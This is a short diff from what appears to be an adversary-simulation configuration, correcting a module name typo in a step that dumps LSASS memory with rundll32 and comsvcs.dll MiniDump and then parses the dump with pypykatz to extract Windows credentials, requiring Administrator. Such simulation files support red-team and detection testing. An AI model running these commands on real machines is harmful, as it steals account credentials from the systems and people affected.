@@ -79,7 +79,7 @@ simulation:
       script: powershell_execute "C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Temp\lsass-comsvcs.dmp full"
     - type: application
       name: pypykatz
-      module: minidumo
+      module: minidump
       script: pypykatz lsa minidump /home/kali/lsass-comsvcs.dmp
   permissions_required:
     - Administrator
